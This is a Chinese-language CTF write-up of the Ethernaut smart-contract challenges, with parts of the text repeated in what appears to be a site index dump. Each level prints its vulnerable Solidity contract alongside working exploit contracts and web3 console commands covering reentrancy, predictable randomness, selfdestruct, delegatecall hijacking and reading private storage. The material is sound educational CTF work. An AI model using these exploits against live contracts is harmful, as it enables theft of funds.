\u975e\u5e38\u7cdf\u5fc3\u7684\u662f\u6ca1\u6709\u627e\u5230\u8db3\u591f\u7684faucet\u83b7\u53d6\u8db3\u591f\u7684eth\u6765\u652f\u4ed8gas\uff0c\u6ca1\u60f3\u5230\u5c45\u7136\u5361\u5728\u4e86\u8fd9\u4e00\u6b65\u3002\u5728Goerli\u6269\u5c55\u7f51\u7edc\u4e0b\uff0c\u627e\u5230\u4e00\u4e2a \u6c34\u9f99\u5934 \uff0c\u6bcf\u5929\u53ef\u4ee5\u67090.005\uff0c\u867d\u7136\u5f88\u5c11\uff0c\u4f46\u662f\u5b58\u4e00\u5b58\u52c9\u5f3a\u591f\u7528\u3002\uff08GAS\u8d39\u597d\u8d35\uff0c\u90fd\u5feb0.01\u4e86\uff09 \u540e\u6765\u53d1\u73b0\u8fd9\u4e2a \u624b\u52a8\u6316 \uff0c\u76f4\u63a5\u6316\u4e86\u4e00\u4e9b\uff0c\u611f\u89c9\u8fd9\u6837\u8db3\u591f\u4e86\u3002 Hello Ethernaut \u00b6 \u8df3\u8fc7\u4e86\uff0c\u4e0d\u60f3\u6d6a\u8d39\u597d\u4e0d\u5bb9\u6613\u51d1\u7684Gas\u8d39\uff0c\u5c31\u662f\u4e00\u4e9b\u57fa\u672c\u64cd\u4f5c\u7684\u6559\u5b66\u3002 Fallback \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Fallback { mapping ( address => uint ) public contributions ; address public owner ; constructor () { owner = msg.sender ; contributions [ msg.sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function contribute () public payable { require ( msg.value < 0 . 001 ether ); contributions [ msg.sender ] += msg.value ; if ( contributions [ msg.sender ] > contributions [ owner ]) { owner = msg.sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg.sender ]; } function withdraw () public onlyOwner { payable ( owner ). transfer ( address ( this ). balance ); } receive () external payable { require ( msg.value > 0 && contributions [ msg.sender ] > 0 ); owner = msg.sender ; } } \u9898\u76ee\u8981\u6c42\uff0c\u6539\u53d8\u5408\u7ea6\u6240\u6709\u8005\u4e3a\u73a9\u5bb6\uff0c\u5e76\u53d6\u51fa\u6240\u6709\u7684\u4f59\u989d\u3002 \u6839\u636e\u5408\u7ea6\u4ee3\u7801\uff0c\u8981\u6c42\u73a9\u5bb6\u7684contribution\u503c\u5927\u4e8e\u539f\u5408\u7ea6\u62e5\u6709\u8005\u65f6\u79fb\u4ea4\u6240\u6709\u6743\uff0c\u4f46\u662f\u8fd9\u662f\u96be\u4ee5\u5b9e\u73b0\u7684\uff0c\u56e0\u6b64\u9700\u8981\u5229\u7528receive\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u5408\u7ea6\u63a5\u6536\u4ea4\u6613\u65f6\u5c31\u4f1a\u6267\u884c\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u5148\u4f7f\u73a9\u5bb6contribution\u5927\u4e8e0\uff0c\u5e76\u5411\u5408\u7ea6\u53d1\u9001\u5927\u4e8e0\u7684\u4ea4\u6613\u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002 await contract . contribute ({ value : 1 }) await contract . sendTransaction ({ value : 1 }) await contract . withdraw () Fallout \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Fallout { using SafeMath for uint256 ; mapping ( address => uint ) allocations ; address payable public owner ; /* constructor */ function Fal1out () public payable { owner = msg.sender ; allocations [ owner ] = msg.value ; } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function allocate () public payable { allocations [ msg.sender ] = allocations [ msg.sender ]. add ( msg.value ); } function sendAllocation ( address payable allocator ) public { require ( allocations [ allocator ] > 0 ); allocator . transfer ( allocations [ allocator ]); } function collectAllocations () public onlyOwner { msg.sender . transfer ( address ( this ). balance ); } function allocatorBalance ( address allocator ) public view returns ( uint ) { return allocations [ allocator ]; } } \u53ef\u4ee5\u53d1\u73b0\u5408\u7ea6\u7684constructor\u51fd\u6570\u662fFal1out\uff0c\u56e0\u6b64\u76f4\u63a5\u8c03\u7528 contract . Fal1out () \u5373\u53ef\u5b8c\u6210\u672c\u9898 Coinflip \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u8fd9\u9053\u9898\u8ba9\u6211\u5b66\u4e60\u4e86\u5982\u4f55\u901a\u8fc7Remix\u90e8\u7f72\u5408\u7ea6\u5e76\u6267\u884c\u76f8\u5e94\u7684\u5408\u7ea6\u51fd\u6570\uff0c\u672c\u9898\u9700\u8981\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u56e0\u4e3a\u9898\u76ee\u5408\u7ea6\u4e2d\u8981\u6c42 lastHash != blockValue \uff0c\u5b89\u7167\u9898\u76ee\u8981\u6c42\u6267\u884c10\u6b21\u5373\u53ef\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } contract hack { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; CoinFlip c = CoinFlip ( 0x2Ee20b7C14d2c7376F8E04cA175D840FF0644B85 ); function exp () public { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; c . flip ( side ); } } Telephone \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Telephone { address public owner ; constructor () { owner = msg.sender ; } function changeOwner ( address _owner ) public { if ( tx.origin != msg.sender ) { owner = _owner ; } } } \u8fd9\u91cc\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u5c31\u662ftx.origin\u662f\u6574\u4e2a\u4ea4\u6613\u7684\u6700\u539f\u59cb\u53d1\u9001\u8005\uff0c\u800cmsg.sender\u5219\u662f\u5f53\u524d\u8c03\u7528\u8005\uff1a tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740 msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740 \u4e8e\u662f\uff0c\u53ea\u8981\u90e8\u7f72\u4e00\u4e2a\u5408\u7ea6\u6765\u8c03\u7528changeOwner\u65b9\u6cd5\u5373\u53ef\uff0c\u5408\u7ea6\u7f16\u5199\u5f88\u7b80\u5355\uff0c\u8fd9\u91cc\u5c31\u4e0d\u653e\u4e86\u3002 Token \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg.sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg.sender ] - _value >= 0 ); balances [ msg.sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u8fd9\u91cc\u8003\u5bdf\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u662fuint\u6ea2\u51fa\uff0c\u6ea2\u51fa\u540e\u5c31\u80fd\u83b7\u5f97\u5f88\u5927\u7684\u6570\u503c\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 await contract . transfer ( contract . address , 21 ) \u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002 Delegation \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Delegate { address public owner ; constructor ( address _owner ) { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg.data ); if ( result ) { this ; } } } \u8fd9\u9053\u9898\u7684\u8003\u70b9\u662fdelegatecall\uff0c\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7684\u662f\u7ecf\u8fc7 abi . encodeWithSignature \u540e\u7684\u51fd\u6570\uff0c\u67e5\u8be2\u6587\u6863\u53ef\u77e5\u53ea\u8981\u53d6\u51fd\u6570\u540dsha3\u540e\u7684\u524d4\u4e2a\u5b57\u8282\u5373\u53ef\u3002 > web3 . utils . sha3 ( \"pwn()\" ) '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab' > contract . sendTransaction ({ data : \"0xdd365b8b\" }) Force \u00b6 \u867d\u7136\u65e0\u6cd5\u5411\u5408\u7ea6\u8f6c\u8d26\uff0c\u4f46\u662f\u5728\u5408\u7ea6\u81ea\u6bc1\u65f6\uff0c\u53ef\u4ee5\u5f3a\u5236\u5956\u4f59\u989d\u8f6c\u5230\u6307\u5b9a\u5730\u5740\uff0c\u56e0\u6b64\u53ea\u9700\u5148\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c\u5411\u5176\u8f6c\u8d26\u540e\uff0c\u518d\u81ea\u6bc1\u5408\u7ea6\u5373\u53ef\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor () public payable {} // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6 function exp ( address challenge ) public { // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable address payable challenge = payable ( address ( challenge )); selfdestruct ( challenge ); } } Vault \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u7531\u4e8e\u533a\u5757\u94fe\u4e0a\u7684\u4e00\u5207\u90fd\u662f\u516c\u5f00\u7684\uff0c\u56e0\u6b64private\u53d8\u91cf\u4e5f\u662f\u53ef\u4ee5\u770b\u5230\u7684\uff0c\u4e0b\u9762\u5c31\u7528\u4e86Tony\u8001\u5e08\u7684\u89e3\u9898\u4ee3\u7801\u3002 > await web3 . eth . getStorageAt ( instance , 1 ) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' > web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) 'A very strong secret password :)' > await contract . unlock ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) // \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb King \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract King { address payable king ; uint public prize ; address payable public owner ; constructor () public payable { owner = msg.sender ; king = msg.sender ; prize = msg.value ; } receive () external payable { require ( msg.value >= prize || msg.sender == owner ); king . transfer ( msg.value ); king = msg.sender ; prize = msg.value ; } function _king () public view returns ( address payable ) { return king ; } } \u5728\u66f4\u6362king\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u4f59\u989d\u8f6c\u5230\u4e0a\u4e00\u4efbking\uff0c\u53ea\u8981\u9009\u62e9\u4e0d\u63a5\u53d7\uff0c\u5373\u53ef\u4e0d\u5b8c\u6210\u6362\u4efb\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528revert\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor ( address challenge ) public payable { challenge . call { value : msg.value }( \"\" ); } fallback () external { revert (); } } \u53ea\u8981\u8f6c\u7684\u94b1\u6bd4prize(1300889614901161 wei)\u591a\u5c31\u53ef\u4ee5\u4e86\u3002 Re-entrancy \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.12 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg.value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg.sender ] >= _amount ) { ( bool result ,) = msg.sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg.sender ] -= _amount ; } } receive () external payable {} } \u8fd9\u9898\u8003\u5bdf\u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3awithdraw\u662f\u5148\u8f6c\u8d26\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528receive\u6216fallback\u4e00\u76f4withdraw\u3002\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u540e\u6765\u53d1\u73b0\u662f\u6539\u4e86\u5408\u7ea6\u4ee3\u7801\u540e\u5fd8\u8bb0\u91cd\u65b0\u7f16\u8bd1\u4e86\uff0c\u6d6a\u8d39\u4e86\u597d\u591agas\u8d39qaq\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Reentrance */ contract Exploit { Reentrance challenge ; constructor ( address payable addr ) public payable { challenge = Reentrance ( addr ); } function exp () public { challenge . withdraw ( 0 . 001 ether ); } fallback () external payable { if ( address ( challenge ). balance >= 0 ) { challenge . withdraw ( 0 . 001 ether ); } } } \u6267\u884c\u5408\u7ea6\u524d\uff0c\u9700\u8981\u5148donate\u4fdd\u8bc1\u5408\u7ea6\u53ef\u4ee5\u53d6\u94b1\u3002 contract . donate . sendTransaction ( < exp contract addr > , { value : toWei ( \"0.001\" )}) Elevator \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg.sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u8fd9\u9898\u5b66\u4e60\u4e86solidity\u4e2d\u63a5\u53e3\u7684\u4e00\u4e9b\u7528\u6cd5\uff0c\u6839\u636e\u9898\u76ee\u8be6\u89e3\u4e5f\u4e86\u89e3\u5230\u4e86view\u548cpure\u51fd\u6570\u4fee\u6539\u5668\u7684\u4f5c\u7528\uff0c\u53ef\u4ee5\u9632\u6b62\u72b6\u6001\u88ab\u7be1\u6539\uff0c\u4f46\u662f\u5373\u4f7f\u8fd9\u6837\uff0c\u4e5f\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u4e0d\u540c\u8f93\u5165\u5f97\u5230\u4e0d\u540c\u8f93\u51fa\u7684\u51fd\u6570\u89e3\u51fa\u672c\u9898\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Elevator */ contract Exploit { Elevator elevator ; bool top = true ; constructor ( address challenge ) public { elevator = Elevator ( challenge ); } function isLastFloor ( uint ) public returns ( bool ) { top = ! top ; // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c return top ; } function exp () public { elevator . goTo ( 1 ); } } Privacy \u00b6","title":"Ethernaut"},{"location":"ctf/writeups/ethernaut/#ethernaut","text":"\u7ea6 938 \u4e2a\u5b57 402 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f Abstract \u611f\u89c9\u8fd9\u4e2a\u7cfb\u5217\u662fBlockchain\u6bd4\u8f83\u6709\u540d\u7684\u65b0\u624b\u9898\u76ee\u7cfb\u5217\uff0c\u5e0c\u671b\u80fd\u501f\u6b64\u5b66\u4f1a\u4e00\u4e9bBlockchain\u57fa\u7840\u6280\u80fd\uff0c\u4e0d\u81f3\u4e8e\u6bd4\u8d5b\u7684\u65f6\u5019\u65e0\u8111\u8df3\u8fc7\u3002 \u9898\u76ee\u94fe\u63a5 \u975e\u5e38\u7cdf\u5fc3\u7684\u662f\u6ca1\u6709\u627e\u5230\u8db3\u591f\u7684faucet\u83b7\u53d6\u8db3\u591f\u7684eth\u6765\u652f\u4ed8gas\uff0c\u6ca1\u60f3\u5230\u5c45\u7136\u5361\u5728\u4e86\u8fd9\u4e00\u6b65\u3002\u5728Goerli\u6269\u5c55\u7f51\u7edc\u4e0b\uff0c\u627e\u5230\u4e00\u4e2a \u6c34\u9f99\u5934 \uff0c\u6bcf\u5929\u53ef\u4ee5\u67090.005\uff0c\u867d\u7136\u5f88\u5c11\uff0c\u4f46\u662f\u5b58\u4e00\u5b58\u52c9\u5f3a\u591f\u7528\u3002\uff08GAS\u8d39\u597d\u8d35\uff0c\u90fd\u5feb0.01\u4e86\uff09 \u540e\u6765\u53d1\u73b0\u8fd9\u4e2a \u624b\u52a8\u6316 \uff0c\u76f4\u63a5\u6316\u4e86\u4e00\u4e9b\uff0c\u611f\u89c9\u8fd9\u6837\u8db3\u591f\u4e86\u3002","title":"Ethernaut"},{"location":"ctf/writeups/ethernaut/#hello-ethernaut","text":"\u8df3\u8fc7\u4e86\uff0c\u4e0d\u60f3\u6d6a\u8d39\u597d\u4e0d\u5bb9\u6613\u51d1\u7684Gas\u8d39\uff0c\u5c31\u662f\u4e00\u4e9b\u57fa\u672c\u64cd\u4f5c\u7684\u6559\u5b66\u3002","title":"Hello Ethernaut"},{"location":"ctf/writeups/ethernaut/#fallback","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Fallback { mapping ( address => uint ) public contributions ; address public owner ; constructor () { owner = msg.sender ; contributions [ msg.sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function contribute () public payable { require ( msg.value < 0 . 001 ether ); contributions [ msg.sender ] += msg.value ; if ( contributions [ msg.sender ] > contributions [ owner ]) { owner = msg.sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg.sender ]; } function withdraw () public onlyOwner { payable ( owner ). transfer ( address ( this ). balance ); } receive () external payable { require ( msg.value > 0 && contributions [ msg.sender ] > 0 ); owner = msg.sender ; } } \u9898\u76ee\u8981\u6c42\uff0c\u6539\u53d8\u5408\u7ea6\u6240\u6709\u8005\u4e3a\u73a9\u5bb6\uff0c\u5e76\u53d6\u51fa\u6240\u6709\u7684\u4f59\u989d\u3002 \u6839\u636e\u5408\u7ea6\u4ee3\u7801\uff0c\u8981\u6c42\u73a9\u5bb6\u7684contribution\u503c\u5927\u4e8e\u539f\u5408\u7ea6\u62e5\u6709\u8005\u65f6\u79fb\u4ea4\u6240\u6709\u6743\uff0c\u4f46\u662f\u8fd9\u662f\u96be\u4ee5\u5b9e\u73b0\u7684\uff0c\u56e0\u6b64\u9700\u8981\u5229\u7528receive\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u5408\u7ea6\u63a5\u6536\u4ea4\u6613\u65f6\u5c31\u4f1a\u6267\u884c\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u5148\u4f7f\u73a9\u5bb6contribution\u5927\u4e8e0\uff0c\u5e76\u5411\u5408\u7ea6\u53d1\u9001\u5927\u4e8e0\u7684\u4ea4\u6613\u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002 await contract . contribute ({ value : 1 }) await contract . sendTransaction ({ value : 1 }) await contract . withdraw ()","title":"Fallback"},{"location":"ctf/writeups/ethernaut/#fallout","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Fallout { using SafeMath for uint256 ; mapping ( address => uint ) allocations ; address payable public owner ; /* constructor */ function Fal1out () public payable { owner = msg.sender ; allocations [ owner ] = msg.value ; } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function allocate () public payable { allocations [ msg.sender ] = allocations [ msg.sender ]. add ( msg.value ); } function sendAllocation ( address payable allocator ) public { require ( allocations [ allocator ] > 0 ); allocator . transfer ( allocations [ allocator ]); } function collectAllocations () public onlyOwner { msg.sender . transfer ( address ( this ). balance ); } function allocatorBalance ( address allocator ) public view returns ( uint ) { return allocations [ allocator ]; } } \u53ef\u4ee5\u53d1\u73b0\u5408\u7ea6\u7684constructor\u51fd\u6570\u662fFal1out\uff0c\u56e0\u6b64\u76f4\u63a5\u8c03\u7528 contract . Fal1out () \u5373\u53ef\u5b8c\u6210\u672c\u9898","title":"Fallout"},{"location":"ctf/writeups/ethernaut/#coinflip","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u8fd9\u9053\u9898\u8ba9\u6211\u5b66\u4e60\u4e86\u5982\u4f55\u901a\u8fc7Remix\u90e8\u7f72\u5408\u7ea6\u5e76\u6267\u884c\u76f8\u5e94\u7684\u5408\u7ea6\u51fd\u6570\uff0c\u672c\u9898\u9700\u8981\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u56e0\u4e3a\u9898\u76ee\u5408\u7ea6\u4e2d\u8981\u6c42 lastHash != blockValue \uff0c\u5b89\u7167\u9898\u76ee\u8981\u6c42\u6267\u884c10\u6b21\u5373\u53ef\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } contract hack { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; CoinFlip c = CoinFlip ( 0x2Ee20b7C14d2c7376F8E04cA175D840FF0644B85 ); function exp () public { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; c . flip ( side ); } }","title":"Coinflip"},{"location":"ctf/writeups/ethernaut/#telephone","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Telephone { address public owner ; constructor () { owner = msg.sender ; } function changeOwner ( address _owner ) public { if ( tx.origin != msg.sender ) { owner = _owner ; } } } \u8fd9\u91cc\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u5c31\u662ftx.origin\u662f\u6574\u4e2a\u4ea4\u6613\u7684\u6700\u539f\u59cb\u53d1\u9001\u8005\uff0c\u800cmsg.sender\u5219\u662f\u5f53\u524d\u8c03\u7528\u8005\uff1a tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740 msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740 \u4e8e\u662f\uff0c\u53ea\u8981\u90e8\u7f72\u4e00\u4e2a\u5408\u7ea6\u6765\u8c03\u7528changeOwner\u65b9\u6cd5\u5373\u53ef\uff0c\u5408\u7ea6\u7f16\u5199\u5f88\u7b80\u5355\uff0c\u8fd9\u91cc\u5c31\u4e0d\u653e\u4e86\u3002","title":"Telephone"},{"location":"ctf/writeups/ethernaut/#token","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg.sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg.sender ] - _value >= 0 ); balances [ msg.sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u8fd9\u91cc\u8003\u5bdf\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u662fuint\u6ea2\u51fa\uff0c\u6ea2\u51fa\u540e\u5c31\u80fd\u83b7\u5f97\u5f88\u5927\u7684\u6570\u503c\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 await contract . transfer ( contract . address , 21 ) \u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002","title":"Token"},{"location":"ctf/writeups/ethernaut/#delegation","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Delegate { address public owner ; constructor ( address _owner ) { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg.data ); if ( result ) { this ; } } } \u8fd9\u9053\u9898\u7684\u8003\u70b9\u662fdelegatecall\uff0c\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7684\u662f\u7ecf\u8fc7 abi . encodeWithSignature \u540e\u7684\u51fd\u6570\uff0c\u67e5\u8be2\u6587\u6863\u53ef\u77e5\u53ea\u8981\u53d6\u51fd\u6570\u540dsha3\u540e\u7684\u524d4\u4e2a\u5b57\u8282\u5373\u53ef\u3002 > web3 . utils . sha3 ( \"pwn()\" ) '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab' > contract . sendTransaction ({ data : \"0xdd365b8b\" })","title":"Delegation"},{"location":"ctf/writeups/ethernaut/#force","text":"\u867d\u7136\u65e0\u6cd5\u5411\u5408\u7ea6\u8f6c\u8d26\uff0c\u4f46\u662f\u5728\u5408\u7ea6\u81ea\u6bc1\u65f6\uff0c\u53ef\u4ee5\u5f3a\u5236\u5956\u4f59\u989d\u8f6c\u5230\u6307\u5b9a\u5730\u5740\uff0c\u56e0\u6b64\u53ea\u9700\u5148\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c\u5411\u5176\u8f6c\u8d26\u540e\uff0c\u518d\u81ea\u6bc1\u5408\u7ea6\u5373\u53ef\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor () public payable {} // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6 function exp ( address challenge ) public { // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable address payable challenge = payable ( address ( challenge )); selfdestruct ( challenge ); } }","title":"Force"},{"location":"ctf/writeups/ethernaut/#vault","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u7531\u4e8e\u533a\u5757\u94fe\u4e0a\u7684\u4e00\u5207\u90fd\u662f\u516c\u5f00\u7684\uff0c\u56e0\u6b64private\u53d8\u91cf\u4e5f\u662f\u53ef\u4ee5\u770b\u5230\u7684\uff0c\u4e0b\u9762\u5c31\u7528\u4e86Tony\u8001\u5e08\u7684\u89e3\u9898\u4ee3\u7801\u3002 > await web3 . eth . getStorageAt ( instance , 1 ) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password 